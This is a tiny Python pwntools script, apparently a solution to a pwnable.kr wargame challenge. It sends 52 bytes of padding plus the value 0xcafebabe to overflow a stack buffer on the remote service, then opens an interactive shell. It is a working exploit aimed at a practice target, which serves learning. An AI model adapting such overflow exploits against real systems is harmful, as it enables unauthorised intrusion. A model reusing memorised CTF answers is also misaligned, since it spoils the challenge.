from pwn import *

s = 0xcafebabe

io = remote('pwnable.kr', 9000)
io.sendline('a'*52 + p32(s))
io.interactive()
